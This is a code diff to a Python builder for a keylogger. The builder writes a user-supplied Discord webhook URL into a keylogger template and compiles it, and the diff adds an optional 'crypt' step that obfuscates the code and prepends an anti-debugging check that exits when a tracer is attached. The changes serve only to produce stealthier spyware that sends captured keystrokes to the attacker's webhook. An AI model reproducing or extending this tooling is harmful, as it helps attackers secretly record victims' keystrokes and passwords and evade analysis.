@@ -5,6 +5,7 @@
 
 import os
 import sys
+import crypter
 import subprocess
 from colorama import init, Fore
 
@@ -108,14 +109,24 @@ def main():
             while url.strip() == "":
                 print("\nPlease enter your Discord webhook URL!")
                 input("Press enter to continue...")
-                os.system("cls")
+                os.system("cls") 
                 continue
             discord_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "remote", "keylogger.py")
             python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
             with open(discord_file, "r", encoding="utf-8") as f:
                 content = f.read()
+            crypt = input("Crypt code [y/n]: ")
+            if crypt.lower().strip() == "y" or crypt.lower().strip() == "yes":
+                content = crypter.obfuscate_code("if hasattr(sys, '_getframe') and (sys._getframe(1).f_trace is not None or sys.gettrace() is not None): sys.exit(1)\n" + content.replace("YOUR_WEBHOOK_URL", url))
+            elif crypt.lower().strip() == "n" or crypt.lower().strip() == "no":
+                pass
+            else:
+                print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
+                input("Press enter to continue...")
+                os.system("cls")
+                continue
             with open(python_file, "w", encoding="utf-8") as f:
-                f.write(content.replace("YOUR_WEBHOOK_URL", url))
+                f.write(content)
             build()
             try:
                 os.remove(python_file)
@@ -123,14 +134,29 @@ def main():
                 pass
             break
         elif choice == 2:
-            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "local", "keylogger.py")
+            local_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "local", "keylogger.py")
+            python_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger.py")
+            with open(local_file, "r", encoding="utf-8") as f:
+                content = f.read()
+            crypt = input("Crypt code [y/n]: ")
+            if crypt.lower().strip() == "y" or crypt.lower().strip() == "yes":
+                content = crypter.obfuscate_code("if hasattr(sys, '_getframe') and (sys._getframe(1).f_trace is not None or sys.gettrace() is not None): sys.exit(1)\n" + content)
+            elif crypt.lower().strip() == "n" or crypt.lower().strip() == "no":
+                pass
+            else:
+                print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
+                input("Press enter to continue...")
+                os.system("cls")
+                continue
+            with open(python_file, "w", encoding="utf-8") as f:
+                f.write(content)
             build()
             break
         elif choice == 3:
             break
         else:
             print(f"\n{Fore.LIGHTRED_EX}Invalid choice, try again.")
-            input("Press enter to continue...")
+            input("Press enter to continue...") 
             os.system("cls")
             continue
 
